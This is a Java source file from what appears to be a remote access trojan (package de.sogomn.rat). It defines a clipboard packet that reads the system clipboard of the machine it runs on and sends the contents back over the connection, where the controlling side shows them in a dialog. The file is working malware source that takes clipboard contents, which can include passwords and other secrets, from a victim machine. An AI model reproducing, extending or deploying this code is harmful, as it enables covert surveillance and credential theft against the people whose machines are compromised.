package de.sogomn.rat.packet;

import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;

import javax.swing.JDialog;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveConnection;

public final class ClipboardPacket extends AbstractPingPongPacket {
	
	private String clipboardContent;
	
	public ClipboardPacket() {
		type = REQUEST;
		clipboardContent = "";
	}
	
	@Override
	protected void sendRequest(final ActiveConnection client) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection client) {
		client.writeUTF(clipboardContent);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection client) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection client) {
		clipboardContent = client.readUTF();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection client) {
		type = DATA;
		
		try {
			final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			final Object clipboardObject = clipboard.getData(DataFlavor.stringFlavor);
			
			if (clipboardObject != null) {
				clipboardContent = (String)clipboardObject;
			}
		} catch (final HeadlessException | UnsupportedFlavorException | IOException ex) {
			clipboardContent = "";
		}
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection client) {
		final JOptionPane optionPane = new JOptionPane(clipboardContent);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
}
